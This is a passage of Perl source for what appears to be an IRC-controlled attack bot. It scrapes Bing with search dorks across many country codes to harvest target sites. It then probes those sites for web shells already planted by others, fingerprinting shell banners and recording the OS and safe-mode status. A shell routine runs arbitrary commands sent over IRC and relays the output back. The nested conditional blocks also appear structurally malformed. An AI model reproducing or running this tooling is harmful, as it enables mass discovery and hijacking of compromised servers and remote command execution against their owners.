        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ar&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingAR/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingCL() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=cl&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingCL/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingAU() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=au&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingAU/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}
#########################################

sub clean() {
    my @cln = ();
    my %visit = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visit{$element}++;
        push @cln, $element;
    }
    return @cln;
}

sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/\?/\%3F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
	$dork =~ s/@/\%40/g;
	$dork =~ s/\[/\%5B/g;
	$dork =~ s/\]/\%5D/g;
	$dork =~ s/\?/\%3F/g;
	$dork =~ s/\=/\%3D/g;
	$dork =~ s/\|/\%7C/g;
    return $dork;
}

sub links() {
    my @list;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push(@list,$link,$host,$hdir);
    return @list;
}

sub search_engine_query() {
    my $url = $_[0];
    $url =~ s/http:\/\///;
    my $host = $url;
    my $query = $url;
    my $page  = "";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    if ($query eq "") { $query = "/"; }
        eval {
            my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
            print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: $uagent\r\n\r\n";
            my @pages = <$sock>;
            $page = "@pages";
            close($sock);
        };
    return $page;
}

#########################################
sub backdoorCheck {
    my ($site,@path) = @_;
    my @result = ("false");
    my $url;
    my $safe;
    my $os;
    my $siteUrl;
    my $key = 0;

    foreach my $path(@path) {

		if($path =~ /\+/) {
			my @part = split(/\+/,$path);
			$url = "http://".$site.$part[0]."?".$part[1];
			$siteUrl = "http://".$site.$part[0];
		} else {
			$url = "http://".$site.$path;
			$siteUrl = "http://".$site.$path;
		}
		
		my $check  = &get_content($url);
		sleep(3);

        if($check =~ m/SAFE_MODE/ig or $check =~ m/Uname/ig or $check =~ /GIF89a/ig){
            $safe = '';$os = '';
            if ($check =~ m/SAFE_MODE : (.*?)<\/b>/) { $safe = $1;}
            if ($check =~ m/Uname : (.*?)<\/b>/){ $os=$1;}
            if(lc($safe) eq "on") { $safe = "14ON";} else { $safe = "3OFF";};

            if($os ne ""){
                @result = ();
                @result = ($siteUrl, $os, $safe,$key);
                last;
            } 
        if($check =~ m/GIF89aGLO /ig or $check =~ m/Uname/ig or $check =~ /Peterson - Shell/ig){
            $safe = '';$os = '';
            if ($check =~ m/SAFE_MODE : (.*?)<\/b>/) { $safe = $1;}
            if ($check =~ m/Uname : (.*?)<\/b>/){ $os=$1;}
            if(lc($safe) eq "on") { $safe = "14ON";} else { $safe = "3OFF";};

            if($os ne ""){
                @result = ();
                @result = ($siteUrl, $os, $safe,$key);
                last;
            } 
        if($check =~ m/BArNEr/ig or $check =~ m/Uname/ig or $check =~ /GIF89a/){
            $safe = '';$os = '';
            if ($check =~ m/SAFE_MODE : (.*?)<\/b>/) { $safe = $1;}
            if ($check =~ m/Uname : (.*?)<\/b>/){ $os=$1;}
            if(lc($safe) eq "on") { $safe = "14ON";} else { $safe = "3OFF";};

            if($os ne ""){
                @result = ();
                @result = ($siteUrl, $os, $safe,$key);
                last;
            } 
        if($check =~ m/roin - exploit/ig or $check =~ m/Uname/ig or $check =~ /GIF89a/){
            $safe = '';$os = '';
            if ($check =~ m/SAFE_MODE : (.*?)<\/b>/) { $safe = $1;}
            if ($check =~ m/Uname : (.*?)<\/b>/){ $os=$1;}
            if(lc($safe) eq "on") { $safe = "14ON";} else { $safe = "3OFF";};

            if($os ne ""){
                @result = ();
                @result = ($siteUrl, $os, $safe,$key);
                last;
            } 
        } elsif($check =~ m/Software/ig or $check =~ m/Freespace/ig) {
            $safe = '';$os = '';
            if ($check =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}
            if($safe eq "") {
                if ($check =~ m/SAFE MODE is (.*?)\(/) {$safe = $1;}
            }
            if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}
            if ($safe =~ /ON/i) { $safe = "14ON";} else { $safe = "3OFF";};
            
            if($os ne ""){
                @result = ();
                @result = ($siteUrl, $os, $safe,$key);
                last;
            }
        } elsif ($check =~ m/Safe-mode/ig) {
            $safe = '';$os = '';
            if ($check =~ m/Safe-mode:(.*?)\]/i) {$safe = $1;}
            if ($check =~ m/OS:(.*?)\]/i) {$os = $1;}
            if ($safe =~ /ON/i) { $safe = "14ON";} else { $safe = "3OFF";};
            if($os ne ""){
                @result = ();
                @result = ($siteUrl, $os, $safe,$key);
                last;
            } 
        } elsif ($check =~ m/Uname/ig or $check =~ m/Hdd/ig) {
            $safe = '';$os = '';
            if ($check =~ m/Safe mode:<\/span><font(.*?)><b>(.*?)<\/b>/i) {$safe = $2;}
            if ($check =~ m/Cwd:<\/span><\/td><td><nobr>(.*?)?<\/nobr>/i) {$os = $1;}
            if ($safe =~ m/ON/i) { $safe = "14ON";} else { $safe = "3OFF";};
            if($os ne ""){
                @result = ();
                @result = ($siteUrl, $os, $safe,$key);
                last;
            }
        } elsif ($check =~ m/post\>Password:/ig or $check =~ m/name\=\"pass\"/ig) {
            @result = ();
            @result = ($siteUrl, $os, $safe,$key);
            last;
        
        } elsif ($check =~ m/Shell/ig or $check =~ m/Pengguna/ig) {
            $safe = "3OFF";$os = '';
            if ($check =~ /Sistem : (.*?)<\/b>/){$os=$1;}
            if($os ne ""){
                @result = ();
                @result = ($siteUrl, $os, $safe,$key);
                last;
            } 
        } else {
            if($check =~ m/\[uname\]/ig) {
                $safe = '';$os = '';
                if ($check =~ m/\[uname\](.*?)\[\/uname\]/i){$os=$1;}
                if ($check =~ m/Safe Mode = (.*?)>/i) {$safe = $1;}
                if($os ne ""){
                    @result = ();
                    @result = ($siteUrl, $os, $safe,$key);
                    last;
                } 
            }
        }
     }
   }
  }
        $key++;
    }
    return @result;
}



sub shell() {
    my $path = $_[0];
    my $cmd = $_[1];
    if ($cmd =~ /cd (.*)/) {
        chdir("$1") || &msg("$path","No such file or directory");
        return;
    }
    elsif ($pid = fork) { waitpid($pid, 0); }
    else { if (fork) { exit; } else {
        my @output = `$cmd 2>&1 3>&1`;
        my $c = 0;
        foreach my $output (@output) {
            $c++;
            chop $output;
            &msg("$path","$output");
            if ($c == 5) { $c = 0; sleep 3; }
        }
        exit;
    }}
}

sub isAdmin() {
    my $status = 0;
    my $nick = $_[0];
    if ($nick eq $admin) { $status = 1; }
    return $status;
}
sub checkPrivacy {
    my $nick = shift;
    my $out = 0;

    if($privscan and !&isAdmin($nick)) {
        $out = 1;
    }
    return $out;
}
sub msg() {
    return unless $#_ == 1;
    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
}

sub nick() {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}

sub notice() {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}

sub read_dorks() {
	my $dork = uri_escape($_[0]);
	my $file = "dorks.txt";
	my $success = 0;
	open (file,"<$file");
	while (my $dorkx=<file>) {
		chop($dorkx);
		if ($dorkx =~ /$dork/){
		$success = 1;
		}
	}
	close file;
	return $success;
}

sub write_dorks() {
	my $dorks = uri_escape($_[0]);
	my $file = "dorks.txt";
	open (filex,">>$file");
	print filex $dorks."\n";
	close filex;
}